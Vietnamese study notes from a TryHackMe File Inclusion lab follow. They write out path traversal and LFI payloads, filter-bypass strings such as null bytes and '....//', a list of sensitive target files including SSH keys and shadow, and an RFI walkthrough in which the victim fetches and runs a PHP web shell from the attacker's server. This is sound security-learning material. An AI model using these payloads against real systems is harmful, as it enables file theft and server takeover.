# 1- tổng quan
Mày vừa bước sang room mới về nhóm lỗ hổng đính kèm file (File Inclusion). Room này dạy mày 4 món chính:

**Phân biệt rõ 3 khái niệm:**
* **Path Traversal** (leo thư mục kiểu `../../` để đọc file nằm ngoài thư mục web).
* **LFI - Local File Inclusion** (ép server đọc hoặc thực thi các file có sẵn trên máy chủ).
* **RFI - Remote File Inclusion** (bắt server tải thẳng file mã độc từ máy mày về rồi chạy).


* **Cách săn điểm lỗi**: Dò các tham số trên URL hoặc request nhận tên file mà backend không kiểm tra kỹ.
* Cách đục từ A đến Z: <u>Bắt đầu từ việc đọc trộm các file nhạy cảm</u> của hệ thống (như `/etc/passwd`, file config chứa mật khẩu database) <u>cho tới việc leo lên RCE</u> (thực thi mã từ xa để chiếm quyền server).
* **Cách vá lỗi:** Biết cách làm sạch input và cấu hình server chuẩn chỉ để chặn đứng nguy cơ bị đính kèm file bậy.

# 2- Path traversal
Đoạn này bản chất là chỉ mày mấy trò nghịch ngợm đục khoét file của server thông qua mấy cái tham số trên URL.

Bản chất trò này diễn ra như sau:

**1-Thằng dev lười biếng viết code**
<u>Web hay có tính năng tải CV, đổi ngôn ngữ, xem ảnh đại diện</u>. Lập trình viên bất cẩn viết kiểu:<u> người dùng gõ gì trên URL thì bốc thẳng cái đó nhét vào hàm đọc file trên server</u> (`include`, `file_get_contents`).
Ví dụ: `[web.com/get.php?file=cv.pdf](https://web.com/get.php?file=cv.pdf)`
Server ngây thơ đi tìm đúng file `cv.pdf` trả về.
**2-Lỗ hổng sinh ra từ đâu?**
Server không kiểm tra xem người dùng gửi cái gì lên. Dev chỉ mong người ta gửi `cv.pdf` hay `about.php`, nhưng gặp dân nghịch ngợm thì nó đổi thành `/etc/passwd` hoặc chèn đường dẫn file bậy bạ.
![[Pasted image 20260828225033.png|700]]
**3- Mức độ nguy hiểm: Từ xem lén đến cướp quyền server**
* Cấp độ 1 **(Đọc trộm**): Mày lôi được file chứa tài khoản database, mã nguồn web hoặc danh sách user hệ thống về máy để ngắm.
* Cấp độ 2 **(LFI - Chạy file nội b**ộ): Mày tìm cách nhét sẵn một đoạn code độc vào đâu đó trên server (như file ảnh đại diện hoặc file log web) rồi ép server include file đó để nó tự chạy lệnh (RCE), chiếm luôn quyền điều khiển.
* Cấp độ 3 **(RFI - Kéo file từ ngoài về)**: Mày dựng một con server riêng của mày, rồi bảo server nạn nhân tự tải file mã độc từ máy mày về rồi chạy luôn.

**4-Món đòn Path Traversal** (Leo cây đu dây bằng `../`)
![[Pasted image 20260828225136.png]]
Web thường nằm sâu trong thư mục kiểu `/var/www/app/CVs/`.
Thằng dev nối chuỗi thô thiển: `/var/www/app/CVs/` + `$_GET['file']`.
Mày vác combo thần thánh `../../../../` ra ném vào:
`[http://webapp.thm/get.php?file=../../../../etc/passwd](http://webapp.thm/get.php?file=../../../../etc/passwd)`
==Mỗi cụm `../` là lùi ra một cấp thư mục.== Mày lùi 4-5 phát là leo thẳng ra ngoài thư mục gốc (`/`), xong chui tọt vào thư mục `etc` bốc file `passwd` ra đọc ngon ơ.

> [!NOTE] Hiểu như này
> /var/www/app/Cvs/../../../../etc/passwd == /etc/passd
> => nó là linux cơ bản thôi, lỗi nằm ở backend nối cái input trực tiếp vào đường dẫn và đi tới nó


> [!NOTE] Hỏi
> Lỗ hổng này hiện nay còn dùng được thực tế ko ?

![[Pasted image 20260828231737.png]]

**5-Đổi gió sang Windows**
Nếu server chạy Windows thì cơ chế leo cũng y hệt, chỉ khác là leo về ổ `C:\`:
`[http://webapp.thm/get.php?file=../../../../windows/win.ini](http://webapp.thm/get.php?file=../../../../windows/win.ini)`
hoặc `../../../../boot.ini`
![[Pasted image 20260828225607.png]]
**6-Mấy file ngon ăn hay bị nhắm tới nhất:**
* `/etc/passwd`: Xem danh sách tất cả các tài khoản trên máy Linux.
* `/etc/shadow`: Chứa mật khẩu băm của hệ thống (phải có quyền cao mới đọc được).
* `/root/.bash_history`: Lịch sử gõ lệnh của admin, soi xem ông ấy hay lưu pass hay cấu hình gì bậy bạ ở đâu.
* `/root/.ssh/id_rsa`: Chìa khóa riêng tư để SSH thẳng vào server không cần pass.
* `/var/log/apache2/access.log`: File ghi log web, thường dùng để nhét mã độc PHP vào rồi gọi ra chạy (Log Poisoning).
* Windows: `C:\windows\win.ini` hoặc `C:\boot.ini` để xác nhận xem đã leo thư mục thành công hay chưa.

# 3- Local File Inclusion (LFI)
**LFI** (Local File Inclusion) *khác điểm nào so với Path Traversal?* Điểm khác biệt sống còn nằm ở chỗ: <u>Path Traversal chỉ đơn thuần là bốc file ra đọc nội dung thô,</u> *còn LFI là server nuốt file đó vào các hàm nạp mã nguồn như include() hay require() trong PHP*.

Nghĩa là *nếu trong file đó có nhét sẵn đoạn code nào, server sẽ thực thi luôn đoạn code đó trước khi trả kết quả về*. Đây chính là con đường ngắn nhất để leo từ đọc trộm file lên chiếm toàn quyền server (RCE).

*Các hàm PHP hay dính đòn:* include, require, include_once, require_once.

> [!NOTE] Title
> Tại sao nó lại có chức năng như vậy, và các hàm trên có chức năng gì ?

![[Pasted image 20260828233228.png]]
**Hai kịch bản thực chiến thường gặp:**
**1-Thằng dev thả rông hoàn toàn:**
Code kiểu: `include($_GET['lang']);`
Dev tính cho người dùng chọn `EN.php` hay `AR.php`. Nhưng vì không khóa cứng thư mục, mày ném thẳng đường dẫn tuyệt đối vào:
`?lang=/etc/passwd`
Server bốc luôn file hệ thống ra đọc và trả về máy mày.

**2- Thằng dev khôn lỏi gắn thêm thư mục:**
Code kiểu: `include("languages/" . $_GET['lang']);`
Dev tưởng nhét vào thư mục languages là chặn được mày, nhưng vì vẫn nối chuỗi trực tiếp, mày vác ngay combo lùi thư mục `../` ra đấm:
`?lang=../../../../etc/passwd`
Đường dẫn thực tế thành `languages/../../../../etc/passwd`, lùi vài phát là văng ra khỏi thư mục web leo thẳng vào gốc file system.

# 6-
Khi đi pentest thực tế hoặc đánh Black-box (không có mã nguồn trong tay), mày phải vừa nhìn thông báo lỗi vừa dùng mấy bài lách luật (bypass) để qua mặt mấy bộ lọc nửa mùa của dev.

Dưới đây là 4 bài né filter kinh điển trong bài:

**1- Đọc thông báo lỗi và chém đuôi bằng Null Byte (%00) - Lab 3**

* Khi mày gõ bừa một từ như THM, server quăng lỗi: `include(languages/THM.php) ... in /var/www/html/THM-4/index.php`.
* Soi lỗi này mày lụm được 2 tin quan trọng:
* Server tự động kẹp chữ `languages/` ở đầu và nhét thêm đuôi `.php` ở cuối file.
* Thư mục web nằm sâu 4 tầng (`/var/www/html/THM-4/`), tức là cần ít nhất 4 lần `../` để thoát ra ngoài.

> [!NOTE] Title
> Ok tức là có sự lọc và thêm thắt input ở backend


* Vấn đề: Nếu mày gõ `../../../../etc/passwd`, server sẽ tự biến thành `/etc/passwd.php` (file này làm gì có thật).
* *Cách bẻ khóa*: Nhét ký tự kết thúc chuỗi Null Byte `%00` vào sau tên file:
`?lang=../../../../etc/passwd%00`
Hàm xử lý phía dưới (viết bằng C) gặp `%00` là nó tưởng chuỗi đã hết, tự động vứt sạch cái đuôi `.php` phía sau đi. Chiêu này chạy ngon từ PHP 5.3.4 trở về trước.

> [!NOTE] Title
> cái này là cách xử lý nhét thêm ký tự vào input
> --> chèn thêm ký tự kết thúc chuỗi NullByte

**2-Lách bộ lọc chặn đường dẫn (/etc/passwd) - Lab 4**
* Thằng *dev viết lệnh chặn nếu thấy đúng chuỗi `/etc/passwd` thì không cho mở.*
* *Cách bẻ khóa:* Thêm dấu `/.` hoặc `%00` vào đuôi:
`?lang=/etc/passwd/.`
Hệ thống file hiểu dấu chấm `.` là thư mục hiện tại nên vẫn đọc đúng file `/etc/passwd`, nhưng chuỗi text gửi lên lại khác với từ khóa dev chặn nên bộ lọc bị mù.

> [!NOTE] Title
> Ok bypass blacklist--> bằng cách decode, thêm ký tự null

**3- Đòn lồng chuỗi trị bộ lọc xóa 1 lần (Single-pass) - Lab 5**

* *Thằng dev dùng hàm xóa sạch chữ `../` trong dữ liệu gửi lên*. Mày gửi `../../` nó xóa hết chỉ còn lại `etc/passwd`.
* *Cách bẻ khóa:* Lồng thêm chữ vào giữa:
`....//....//....//....//etc/passwd`
Khi server chạy hàm xóa chuỗi `../` ở chính giữa của cụm `....//`, hai nửa còn lại bên ngoài sẽ tự động chập lại với nhau tạo thành chuỗi `../` chuẩn chỉ để leo thư mục.

**4- Chiều lòng server ép thư mục đầu vào** - Lab 6
* *Dev viết code bắt buộc đầu vào phải bắt đầu bằng chữ `languages/` mới chịu chạy.*
* *Cách bẻ khóa*: Mày cứ chiều nó, gõ đúng chữ `languages/` ở đầu rồi mới leo lùi ra sau:
`?lang=languages/../../../../../etc/passwd`
Server kiểm tra thấy có chữ `languages/` hợp lệ nên cho qua, nhưng ngay sau đó đống `../` lại kéo hệ thống lùi ngược về thư mục gốc để đọc file.

> [!success] Tổng kết lại
> Bài này đưa ra 4 cách filter phổ biến mà dev hay dùng đồng thời có các cách khắc phục riêng
> - đầu tiên là thêm thắt vào input--> ta thêm %00 hay jj đó để bypass
> - thứ hai là blacklist --> thì thêm thắt vô input sao cho qua mặt filter
> - thứ 3 là xóa ../../ ==> thì mình có payload như hình
> - thứ 4 là nó thêm thắt thư mục đằng trước ==> thì mình thêm vào ../

![[Pasted image 20260829144641.png]]

> [!NOTE] Title
> Làm sao mà nó đọc được mã nguồn php được hay vậy ?

![[Pasted image 20260829145416.png]]
# 7- Remote file inclusion (RFI)
RFI (Remote File Inclusion) là cấp độ nguy hiểm hơn hẳn LFI. LFI thì mày bị giới hạn bởi những file có sẵn trên máy nạn nhân, còn *RFI là mày bắt con server nạn nhân tự mò sang máy của mày để tải file mã độc về rồi tự chạy luôn.*

**1- Điều kiện để ăn đòn RFI**
*Server nạn nhân phải cấu hình PHP cực kỳ hớ hênh*, cụ thể là bật 2 cờ trong file php.ini:
* allow_url_fopen = On
* allow_url_include = On
Khi 2 cờ này bật, các hàm như include(), require() sẽ chấp nhận luôn cả một đường link HTTP/HTTPS chứ không chỉ là đường dẫn file nội bộ.

> [!NOTE] Title
> 2 cờ này bật thì include() nó nhận luôn dữ liệu từ link

**2-Luồng tấn công 5 bước**
![[Pasted image 20260829175625.png]]
* Bước 1: Mày tự tạo một file chứa code PHP độc trên máy mày (ví dụ `cmd.txt` chứa `<?php system($_GET['cmd']); ?>`). Đặt đuôi .txt để máy mày không tự chạy code đó mà chỉ đóng vai trò cấp file.
* Bước 2: Mày mở một web server mini trên máy mày.
* Bước 3: Bơm thẳng link máy mày vào tham số web nạn nhân: `?file=http://<IP_MÁY_MÀY>/cmd.txt`
* Bước 4: Server nạn nhân thấy link là ngoan ngoãn gửi request sang máy mày tải file về.
* Bước 5: Server nạn nhân nạp file đó vào hàm include và chạy luôn đoạn mã độc. Mày chiếm quyền điều khiển (RCE) ngay lập tức.

**3- Hướng dẫn thực hành Lab Playground**

Bước 1: Mở terminal trên máy AttackBox (hoặc máy ảo của mày), tạo một file payload thử nghiệm:

```bash
echo "<?php system('id'); ?>" > test.txt

```

Bước 2: Dựng web server mini ngay tại thư mục chứa file đó bằng Python:

```bash
python3 -m http.server 8000

```

Bước 3: Lấy IP máy của mày (dùng lệnh `ip a` hoặc xem trên thanh VPN của TryHackMe, ví dụ `10.10.x.x`).

Bước 4: Mở trình duyệt vào trang playground và truyền link file của mày vào tham số:
[http://10.48.141.40/playground.php?file=http://](http://10.48.141.40/playground.php?file=http://)<IP_CỦA_MÀY>:8000/test.txt

Nếu thấy trên terminal Python báo có kết nối tải file và trên web hiện ra kết quả của lệnh `id` (uid=... gid=...) tức là đục RFI thành công.

# 7-
Phần Challenge này là bài kiểm tra tổng hợp, gom hết mấy võ mày vừa học lại để đấm. Điểm khác biệt chí mạng ở phần này là: **vị trí nhận tham số không chỉ nằm trơ trọi trên URL (GET) nữa**, mà thằng dev có thể giấu nó trong phương thức POST hoặc kẹp vào Cookie trình duyệt.

Quy trình 5 bước mày cần làm khi nhảy vào link [http://10.49.153.49/challenges/index.php](http://10.49.153.49/challenges/index.php):

**1-Soi hết các ngóc ngách đầu vào:**
Đừng chỉ nhìn thanh địa chỉ URL. Bật F12 hoặc soi Burp Suite xem web gửi dữ liệu qua đâu: tham số GET trên URL, form gửi dữ liệu ngầm (POST), hay có trường Cookie nào đang chứa tên file/ngôn ngữ không.
**2-Cố tình gõ bậy để ép server nhả lỗi:**
Nhập thử một từ vô nghĩa như `chaoem` rồi gửi. Nếu server sặc ra thông báo Warning/Error, mày soi ngay:

* Nó có tự gắn thêm thư mục ở đầu không?
* Nó có tự nhét thêm đuôi `.php` ở đít không?
* Thư mục web nằm sâu mấy cấp (`/var/www/...`) để tính số lần lùi `../`.

**3- Đừng dùng mỗi trình duyệt, bật Burp Suite lên:**
Nhiều khi gõ trên ô web nó tự mã hóa ký tự làm hỏng payload (như vụ `%00` bị biến thành `%2500` nãy mày dính). Mày bắt gói tin qua Burp Suite Repeater rồi sửa trực tiếp cho chuẩn xác 100%.
**4.-Bốc bài bypass phù hợp ra nã:**

* Thấy bị dính đuôi file: thử chém bằng `%00`.
* Thấy bị xóa mất chuỗi `../`: đổi sang bài lồng `....//`.
* Thấy nó bắt buộc phải có tên thư mục: giữ nguyên tên thư mục đó ở đầu rồi mới lùi `../`.
* Thấy nó chặn từ khóa `/etc/passwd`: lách bằng `/etc/passwd/.`.

5- Mở từng Challenge lên làm, gặp bài nào bí hoặc lỗi gì cứ quăng ảnh lên đây tao chỉ bài đục tiếp.

[[writeup-THM_fileinclusion]]
